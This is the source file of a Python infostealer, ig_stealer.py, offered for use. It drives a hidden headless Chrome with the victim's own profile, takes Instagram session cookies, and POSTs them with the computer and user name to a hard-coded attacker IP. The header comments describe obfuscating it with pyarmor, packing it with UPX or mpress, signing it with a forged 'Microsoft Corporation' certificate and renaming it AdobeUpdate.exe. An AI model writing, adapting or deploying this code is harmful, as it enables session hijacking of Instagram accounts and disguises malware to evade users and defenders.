# ===== FILE: ig_stealer.py =====
# This runs on the VICTIM's computer
# It grabs Instagram cookies and sends them to your receiver
#python -m PyInstaller --onefile ig_stealer.py
#pyinstaller --onefile --noconsole ig_stealer.py
#python -m PyInstaller --onefile --noconsole ig_stealer.py
#python -m pip install nuitka
#nuitka --onefile --windows-disable-console --enable-plugin=tk-inter ig_stealer.py
#python -m nuitka --onefile --windows-disable-console --enable-plugin=tk-inter ig_stealer.py
#pyinstaller --onefile --noconsole --upx-dir=. ig_stealer.py for UPX compression (make sure to download UPX and put it in the same folder as this script)
#py -m PyInstaller --onefile --noconsole Update.py
#python -m nuitka --onefile --windows-disable-console Update.py
#new steps
#New-SelfSignedCertificate -Type Custom -Subject 'CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US' -KeyUsage DigitalSignature -FriendlyName 'Microsoft' -CertStoreLocation 'Cert:\CurrentUser\My' -TextExtension @('2.5.29.37={text}1.3.6.1.5.5.7.3.3', '2.5.29.17={text}upn=microsoft@microsoft.com')
#python -m nuitka --onefile --windows-disable-console Update.py
#Set-AuthenticodeSignature -FilePath "Update.exe" -Certificate (Get-ChildItem -Path Cert:\CurrentUser\My -CodeSigningCert)
#

#-----------
#pip install pyarmor nuitka
#py -m pyarmor.cli gen Update.py
#cd dist
#py -m nuitka --onefile --windows-disable-console Update.py
#python -m nuitka --onefile --windows-disable-console ig_stealer.py
#ren Update.exe AdobeUpdate.exe

#mpress ig_stealer.exe


import time
import json
import requests
import os           # For reading Windows username
import platform     # For getting computer name
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

# ========== CONFIGURATION — CHANGE THESE ==========
ATTACKER_IP = "157.48.4.89"   # <-- Your IP address goes here
ATTACKER_PORT = 8082           # <-- Port number (keep as 8080)
CHECK_INTERVAL = 30             # <-- How often to check (seconds). Set to 60 or 300
# ==================================================

def get_chrome_profile_path():
   
    # Get the username of whoever is logged into Windows right now
    # os.getenv("USERNAME") reads the Windows environment variable
    username = os.getenv("USERNAME")
    
    # Build the full Chrome profile path
    # f-string replaces {username} with the actual username
    profile_path = f"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data"
    
    return profile_path

def steal_instagram_cookies():
    """
    This function does the actual cookie stealing.
    
    Step-by-step what happens:
    1. Get the victim's Chrome profile path
    2. Open Chrome in HEADLESS mode (invisible — no window appears)
    3. Navigate to Instagram.com
    4. Read all cookies and pick only Instagram's important ones
    5. Send them to the attacker's receiver server
    6. Close Chrome ig_stealer.py
    
    After this function finishes, Chrome closes and nothing is left behind.
    """
    
    # === STEP 1: Get the Chrome profile path ===
    chrome_profile = get_chrome_profile_path()
    
    # === STEP 2: Set up Chrome options ===
    options = Options()
    
    # Use the victim's own Chrome profile so Instagram recognizes them
    options.add_argument(f"--user-data-dir={chrome_profile}")
    options.add_argument("--profile-directory=Default")
    
    # ===== HEADLESS MODE =====
    # This is the magic that makes Chrome run INVISIBLY
    # The victim sees nothing — no window, no icon, no taskbar button
    options.add_argument("--headless=new")      # New headless mode (better, more stable)
    options.add_argument("--window-size=800,600") # Fake screen size for headless
    options.add_argument("--no-sandbox")         # Prevent permission errors on Windows
    options.add_argument("--disable-gpu")        # Faster headless (no graphics card needed)
    options.add_argument("--log-level=3")        # Suppress Chrome's console messages
    options.add_argument("--disable-blink-features=AutomationControlled")  # Hide automation from websites
    options.add_experimental_option("excludeSwitches", ["enable-automation"])  # Don't show "Chrome is being controlled"
    options.add_experimental_option("useAutomationExtension", False)  # Don't show automation extension
    
    # === STEP 3: Launch Chrome (victim sees NOTHING) ===
    try:
        driver = webdriver.Chrome(options=options)
    except Exception as e:
        print(f"[-] Could not launch Chrome: {e}")
        return {}
    
    # === STEP 4: Go to Instagram ===
    # Even though Chrome is invisible, it still loads the page fully
    driver.get("https://www.instagram.com")
    
    # Wait 4 seconds for the page to fully load and cookies to become available
    # This is important — without this wait, cookies might not be ready yet
    time.sleep(4)
    
    # === STEP 5: Grab ONLY the important Instagram cookies ===
    # driver.get_cookies() reads ALL cookies from all websites
    # We only care about 4 specific ones for Instagram session hijacking
    cookies = {}
    target_cookies = ["sessionid", "ds_user_id", "csrftoken", "rur"]
    
    # Loop through every cookie Chrome has stored
    for cookie in driver.get_cookies():
        # If this cookie is one of the 4 we want, save it
        if cookie['name'] in target_cookies:
            cookies[cookie['name']] = cookie['value']
            print(f"[+] Found cookie: {cookie['name']}")
    
    # === STEP 6: Close Chrome ===
    driver.quit()
    
    return cookies

def send_to_attacker(cookies):
    """
    This function sends the stolen cookies to your receiver server.
    
    It packages the cookies with extra info like:
    - The computer's name (so you know which victim)
    - The Windows username
    - The Instagram user ID
    """
    
    if not cookies:
        print("[-] No cookies to send")
        return False
    
    # Get computer name and victim username for identification
    computer_name = platform.node()
    victim_user = os.getenv("USERNAME")
    username_id = cookies.get('ds_user_id', 'unknown')
    
    # Package everything into a neat data bundle
    data = {
        "username": username_id,
        "cookies": cookies,
        "computer": computer_name,
        "victim_user": victim_user
    }
    
    # Send it to the attacker's receiver server via HTTP POST
    # This is like submitting a web form
    url = f"http://{ATTACKER_IP}:{ATTACKER_PORT}/steal"
    
    try:
        response = requests.post(url, json=data, timeout=10)
        print(f"[+] Cookies sent successfully! Server says: {response.status_code}")
        return True
    except requests.exceptions.ConnectionError:
        print(f"[-] Could not connect to attacker at {url}")
        print("[-] Make sure receiver.py is running on the attacker machine")
        return False
    except Exception as e:
        print(f"[-] Failed to send: {e}")
        return False

def main():
    """
    This is the main function that runs the whole thing.
    
    It runs in an INFINITE LOOP, checking for cookies every CHECK_INTERVAL seconds.
    Why loop? Because:
    - The victim might not be logged into Instagram right now
    - They might log in later
    - The loop catches them whenever they are logged in
    """
    
    print("[*] Instagram Cookie Stealer Started")
    print(f"[*] Target: {ATTACKER_IP}:{ATTACKER_PORT}")
    print(f"[*] Checking every {CHECK_INTERVAL} seconds")
    print("[*] Running in headless mode (invisible)")
    print("[*] Press Ctrl+C to stop\n")
    
    attempt_count = 0
    
    while True:
        attempt_count += 1
        print(f"\n[*] Attempt #{attempt_count} at {time.strftime('%H:%M:%S')}")
        
        # Step 1: Try to steal cookies
        cookies = steal_instagram_cookies()
        
        # Step 2: If we got cookies, send them
        if cookies:
            print(f"[+] Got {len(cookies)} Instagram cookies!")
            for name, value in cookies.items():
                print(f"    {name} = {value[:20]}...")  # Only show first 20 chars for privacy
            
            success = send_to_attacker(cookies)
            if success:
                print("[+] SUCCESS! Cookies sent to attacker. Exiting.")
                break  # Exit the loop after successful theft
        else:
            print("[-] No Instagram cookies found. Victim may not be logged in.")
        
        # Step 3: Wait before checking again
        print(f"[*] Waiting {CHECK_INTERVAL} seconds before next check...")
        time.sleep(CHECK_INTERVAL)

# ===== THIS IS WHERE THE PROGRAM STARTS =====
# This line says: "If this file was double-clicked (not imported), run main()"
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] Stopped by user")
    except Exception as e:
        print(f"\n[-] Error: {e}")
        #py -m nuitka --standalone --mingw64 --windows-console-mode=disable Update.py
        #py -m nuitka --standalone --windows-console-mode=disable Update.py
